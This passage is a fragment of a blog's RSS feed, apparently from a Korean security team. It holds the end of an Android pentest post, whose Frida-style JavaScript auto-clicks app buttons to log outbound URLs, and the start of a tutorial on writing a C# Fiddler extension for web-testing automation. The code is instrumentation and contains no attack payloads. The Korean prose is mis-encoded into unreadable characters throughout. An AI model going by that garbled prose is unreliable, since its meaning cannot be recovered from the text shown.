&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;findViewById&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;activity&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Java&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;cast&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;getContext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Java&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;use&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;android.app.Activity&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Java&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;cast&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;activity&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;findViewById&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;typeInfo&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;button&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;na&quot;&gt;_class&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Java&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;use&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;android.widget.Button&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
        &lt;span class=&quot;na&quot;&gt;handle&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;btn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;nx&quot;&gt;btn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;performClick&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;componentEvent&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;info&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;typeInfo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;view&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;findViewById&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;_class&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;info&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;handle&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;view&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;fuzz&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[];&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;component&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;cm&quot;&gt;/*
    {
        &quot;type&quot;: &quot;button&quot;,
        &quot;id&quot;: 123124123
    }
    */&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;r&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;component&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;});&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;wait&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;componentEvent&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;í•´ë‹¹ ì½”ë“œë¥¼ ì‚¬ìš©í•˜ì—¬ ì—¬ëŸ¬ ì•±ì— ì ìš©í•˜ë©´ ì–´ëŠ ì •ë„ì˜ ì™¸ë¶€ ìš”ì²­ì„ ê¸°ëŒ€í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;h2 id=&quot;í•œê³„ì &quot;&gt;í•œê³„ì &lt;/h2&gt;

&lt;p&gt;ê°ê°ì˜ ë°©ì‹ì€ ëª¨ë“  ì™¸ë¶€ ìš”ì²­ì„ ë°œìƒì‹œí‚¬ ìˆ˜ ì—†ë‹¤ëŠ” ê³µí†µì ì¸ í•œê³„ì ì´ ì¡´ì¬í•©ë‹ˆë‹¤. ë”°ë¼ì„œ ì–´ëŠ ì •ë„ ë§ì€ ì–‘ì˜ ì™¸ë¶€ ìš”ì²­ì„ ë°œìƒì‹œí‚¬ ìˆ˜ ìˆëŠ”ì§€ì— ëŒ€í•´ì„œ ê³ ë ¤ë˜ì–´ì•¼í•©ë‹ˆë‹¤. ë˜í•œ, Activityë³„ ì™¸ë¶€ ìš”ì²­ì— ëŒ€í•œ ì²˜ë¦¬ì™€ ë¹ ë¥¸ ì‹œê°„ ë‚´ì— ë§ì€ ì™¸ë¶€ ìš”ì²­ URLì„ íŒŒì•…í•  ìˆ˜ ìˆì–´ì•¼í•©ë‹ˆë‹¤.&lt;/p&gt;

&lt;p&gt;1ë²ˆ ë°©ì‹ì˜ ê²½ìš°, &lt;code class=&quot;highlighter-rouge&quot;&gt;extraë¥¼ ì‚¬ìš©í•˜ì§€ ì•ŠëŠ” activity&lt;/code&gt;ì—ì„œ ì™¸ë¶€ ìš”ì²­ì„ í•  ìˆ˜ ìˆìœ¼ë¯€ë¡œ ì ì€ ì–‘ì˜ URLì„ ë¡œê¹…í•  ìˆ˜ ìˆì„ ê²ƒìœ¼ë¡œ ë³´ì´ë©°, 2ë²ˆ ë°©ì‹ì˜ ê²½ìš° &lt;code class=&quot;highlighter-rouge&quot;&gt;android:exported=true ì˜µì…˜ì´ ì„¤ì •ë˜ì–´ìˆì§€ ì•Šì€ activity&lt;/code&gt;ì™€ &lt;code class=&quot;highlighter-rouge&quot;&gt;extraë¥¼ ì‚¬ìš©í•˜ì§€ ì•ŠëŠ” activity&lt;/code&gt;ì— ëŒ€í•´ì„œ ì²˜ë¦¬í•  ìˆ˜ ìˆìœ¼ë¯€ë¡œ 1ë²ˆì˜ ë°©ì‹ë³´ë‹¤ ì ì€ ì–‘ì˜ URLì„ ë¡œê¹…í•  ìˆ˜ ìˆì„ ê²ƒìœ¼ë¡œ ë³´ì…ë‹ˆë‹¤. 3ë²ˆì˜ ë°©ì‹ìœ¼ë¡œ ì½”ë“œë¥¼ ì‘ì„±í•  ê²½ìš°, ì‚¬ìš©ìê°€ ì§ì ‘ ì¡°ì‘í•˜ëŠ” ê²ƒì²˜ëŸ¼ í•  ìˆ˜ ìˆë‹¤ë©´ ë§ì€ ì–‘ì˜ ì™¸ë¶€ ìš”ì²­ì„ ê°€ì ¸ì˜¬ ìˆ˜ ìˆì„ ê²ƒìœ¼ë¡œ ë³´ì…ë‹ˆë‹¤. í•˜ì§€ë§Œ ì´ëŠ” ê° componentë³„ ìƒê´€ê´€ê³„(ex. ë¡œê·¸ì¸, ê²€ìƒ‰ ë“±)ê°€ ì „í˜€ ê³ ë ¤ë˜ì–´ìˆì§€ ì•ŠìŠµë‹ˆë‹¤. ë”°ë¼ì„œ, activityë³„ component ìˆ˜ì— ë”°ë¼ì„œ ëª¨ë“  URLì„ ë¡œê¹…í•˜ê¸° ìœ„í•œ ì‹œê°„ì´ ê²°ì •ë©ë‹ˆë‹¤. ê·¸ëŸ¬ë¯€ë¡œ ë§ì€ componentê°€ ì¡´ì¬í•œë‹¤ë©´ ëª¨ë“  ìš”ì²­ì„ ìœ„í•´ì„œ ìˆ˜ë§ì€ ìš”ì²­ì´ í•„ìš”í•˜ê²Œ ë˜ë©° íš¨ìœ¨ì„±ì´ ë–¨ì–´ì§€ê²Œ ë©ë‹ˆë‹¤.&lt;/p&gt;
</description>
        <pubDate>Wed, 01 Jul 2020 00:00:00 +0000</pubDate>
        <link>http://localhost:4000/2020-07-01/Intent-logging</link>
        <guid isPermaLink="true">http://localhost:4000/2020-07-01/Intent-logging</guid>
        
        <category>android</category>
        
        <category>mobile</category>
        
        <category>pentest</category>
        
        
      </item>
    
      <item>
        <title>Fiddler Extension</title>
        <description>&lt;p&gt;ë¼ì˜¨í™”ì´íŠ¸í–‡ í•µì‹¬ì—°êµ¬íŒ€ ìµœìš©ì„ &lt;/p&gt;

&lt;h1 id=&quot;0-ê°œìš”&quot;&gt;0. ê°œìš”&lt;/h1&gt;

&lt;p&gt;ì›¹ ì·¨ì•½ì  ë¶„ì„ ë° ëª¨ì˜í•´í‚¹ ì‹œ Fiddlerì—ì„œ íŒ¨í‚·ì„ í™•ì¸ í›„ Python ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‘ì„±í•˜ì—¬ ìë™í™”í•˜ëŠ” ê³¼ì •ì„ ìˆ˜í–‰í•˜ê³  ìˆìŠµë‹ˆë‹¤. ë³¸ ë¬¸ì„œëŠ” ì´ë¥¼ ìœ„í•œ ê¸°ì´ˆ í…œí”Œë¦¿(ìŠ¤ë‹ˆí«)ì„ ë§Œë“¤ì–´ì£¼ëŠ” Fiddler Extensionì„ ì œì‘í•˜ëŠ” ê³¼ì •ì„ ì‘ì„±í•˜ì˜€ìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;h1 id=&quot;1-fiddler-extension&quot;&gt;1. Fiddler Extension&lt;/h1&gt;

&lt;p&gt;FiddlerëŠ” Extensionì´ë¼ëŠ” ì´ë¦„ìœ¼ë¡œ í”ŒëŸ¬ê·¸ì¸ ë¹„ìŠ·í•œ ê¸°ëŠ¥ì„ ì§€ì›í•˜ê³  ìˆìŠµë‹ˆë‹¤. ì´ë¯¸ ë§Œë“¤ì–´ì§„ Extensionì„ ì¶”ê°€í•˜ì—¬ ì‚¬ìš©í• ìˆ˜ë„ ìˆê³ , ì‚¬ìš©ìê°€ ì§ì ‘ ì»¤ìŠ¤í…€í•˜ì—¬ ì œì‘í•œ Extensionì„ ì¶”ê°€í•˜ì—¬ ì‚¬ìš©í•˜ëŠ” ê²ƒ ë˜í•œ ê°€ëŠ¥í•©ë‹ˆë‹¤.&lt;/p&gt;

&lt;p&gt;Fiddler Extensionì„ ë§Œë“¤ê¸° ìœ„í•´ì„œëŠ” C#ì„ ì‚¬ìš©í•˜ì—¬ ê°œë°œ í›„ .dll íŒŒì¼ë¡œ ë¹Œë“œí•´ì•¼í•©ë‹ˆë‹¤.&lt;/p&gt;

&lt;h1 id=&quot;2-ê°œë°œ-ì¤€ë¹„&quot;&gt;2. ê°œë°œ ì¤€ë¹„&lt;/h1&gt;

&lt;p&gt;&lt;img src=&quot;/assets/sun0700.png&quot; alt=&quot;/assets/sun0700.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Fiddler Extensionì„ ê°œë°œí•˜ê¸°ì— ì•ì„œ, ì„¤ì •í•´ì£¼ì–´ì•¼í•˜ëŠ” ë¶€ë¶„ì´ ëª‡ ê°€ì§€ ìˆìŠµë‹ˆë‹¤. ê°œë°œì— ì‚¬ìš©ëœ IDEëŠ” Visual Studio 2019ì…ë‹ˆë‹¤.&lt;/p&gt;

&lt;p&gt;ë¨¼ì €, ìœ„ì™€ ê°™ì´ &lt;code class=&quot;highlighter-rouge&quot;&gt;ìƒˆ í”„ë¡œì íŠ¸ ë§Œë“¤ê¸°&lt;/code&gt; ë¥¼ ì„ íƒí•©ë‹ˆë‹¤.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/sun0701.png&quot; alt=&quot;/assets/sun0701.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ë‹¤ìŒìœ¼ë¡œ, dllì„ ë§Œë“¤ê¸° ìœ„í•´ .NET í”„ë ˆì„ì›Œí¬ í”„ë¡œì íŠ¸ë¥¼ ìƒì„±í•©ë‹ˆë‹¤.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/sun0702.png&quot; alt=&quot;/assets/sun0702.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ë§Œë“¤ì–´ì§„ í”„ë¡œì íŠ¸ì˜ ì†”ë£¨ì…˜ íƒìƒ‰ê¸°ì—ì„œ &lt;code class=&quot;highlighter-rouge&quot;&gt;ì°¸ì¡°&lt;/code&gt; ë¥¼ ìš°í´ë¦­í•˜ì—¬ &lt;code class=&quot;highlighter-rouge&quot;&gt;ì°¸ì¡° ì¶”ê°€&lt;/code&gt; ë¥¼ ì„ íƒí•©ë‹ˆë‹¤.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/sun0703.png&quot; alt=&quot;/assets/sun0703.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;ì°¾ì•„ë³´ê¸°&lt;/code&gt; ì—ì„œ Fiddler Clientë¥¼ ì°¾ì•„ ì„ íƒ í›„ ì°¸ì¡°ì— ì¶”ê°€í•´ì¤ë‹ˆë‹¤.&lt;/p&gt;

&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nf&quot;&gt;C:\Program&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Files\Fiddler2\Fiddler.exe&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;C:\Program&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Files&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;x86&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;\Fiddler2\Fiddler.exe&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;C:\Users\&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;UserName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;\AppData\Local\Programs\Fiddler\Fiddler.exe&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ì¼ë°˜ì ì¸ Fiddler Clientì˜ ê²½ë¡œëŠ” ìœ„ì™€ ê°™ìŠµë‹ˆë‹¤.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/sun0704.png&quot; alt=&quot;/assets/sun0704.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ì¶”ê°€ì ìœ¼ë¡œ, ìµœê·¼ Visual Studioë¥¼ ì‚¬ìš©í•  ë•Œ &lt;code class=&quot;highlighter-rouge&quot;&gt;System.Windows.Forms&lt;/code&gt; ê°€ ê¸°ë³¸ìœ¼ë¡œ ë“±ë¡ë˜ì–´ìˆì§€ ì•Šì•„ ì‚¬ìš© ì‹œ ì—ëŸ¬ê°€ ë°œìƒí•  ìˆ˜ ìˆëŠ”ë°, ìœ„ì—ì„œ Fiddler Clientë¥¼ ë“±ë¡í•œ ê³¼ì •ê³¼ ìœ ì‚¬í•˜ê²Œ &lt;code class=&quot;highlighter-rouge&quot;&gt;ì°¸ì¡° ê´€ë¦¬ì&lt;/code&gt;ì—ì„œ  &lt;code class=&quot;highlighter-rouge&quot;&gt;System.Windows.Forms&lt;/code&gt; ë¥¼ ì‚¬ìš©í•˜ë„ë¡ ì²´í¬í•´ì¤ë‹ˆë‹¤.&lt;/p&gt;

&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nf&quot;&gt;C:\Users\&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;UserName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;\Documents\Fiddler2&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ë§ˆì§€ë§‰ìœ¼ë¡œ, ë¹Œë“œí•˜ì—¬ ë§Œë“¤ì–´ì§„ .dll íŒŒì¼ì€ ìœ„ì—ì„œ ì†Œê°œí•œ Fiddlerì˜ ê²½ë¡œ ë˜ëŠ” ìœ„ ê²½ë¡œì˜ &lt;code class=&quot;highlighter-rouge&quot;&gt;Scripts&lt;/code&gt; í´ë”ì— ë„£ì–´ì¤€ ë’¤ Fiddlerë¥¼ ì¬ì‹œì‘í•˜ë©´ ìë™ìœ¼ë¡œ Extensionì´ ë“±ë¡ë©ë‹ˆë‹¤.&lt;/p&gt;

&lt;h1 id=&quot;3-ê°œë°œ-ë°©ë²•&quot;&gt;3. ê°œë°œ ë°©ë²•&lt;/h1&gt;

&lt;p&gt;Fiddler Extension ê°œë°œì€ C#ìœ¼ë¡œ ì´ë£¨ì–´ì§€ë©°, ì¼ë°˜ì ì¸ Windows GUI ê°œë°œê³¼ ë¹„ìŠ·í•˜ë‹¤ê³  ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤. &lt;code class=&quot;highlighter-rouge&quot;&gt;2. ê°œë°œ ì¤€ë¹„&lt;/code&gt; ì—ì„œ ë“±ë¡í•œ Fiddler í´ë˜ìŠ¤ì—ì„œ í´ë˜ìŠ¤, ë©”ì†Œë“œ ë“±ì„ ì‚¬ìš©í•˜ì—¬ Fiddlerì—ì„œ ì‚¬ìš©í•˜ëŠ” ì •ë³´ë¥¼ ì–»ì–´ì™€ ê°€ê³µí•˜ëŠ” ê²ƒì´ ê°€ëŠ¥í•©ë‹ˆë‹¤.&lt;/p&gt;

&lt;div class=&quot;language-csharp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;assembly&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Fiddler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;RequiredVersion&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;2.2.8.6&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)]&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ë¨¼ì €, Fiddler Extensionì€ Fiddler v2.2.8 ì´í›„ ì ìš©ì´ ë˜ì—ˆê¸° ë•Œë¬¸ì— ìœ„ì™€ ê°™ì€ ì½”ë“œë¥¼ ì¶”ê°€í•´ì¤ë‹ˆë‹¤.&lt;/p&gt;

&lt;div class=&quot;language-csharp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;using&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;System&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;using&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;Fiddler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;assembly&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Fiddler&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;RequiredVersion&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;2.2.8.6&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)]&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;namespace&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;ClassLibrary2&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Class1&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IFiddlerExtension&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;OnLoad&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;

        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

        &lt;span class=&quot;k&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;OnBeforeUnload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;

        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
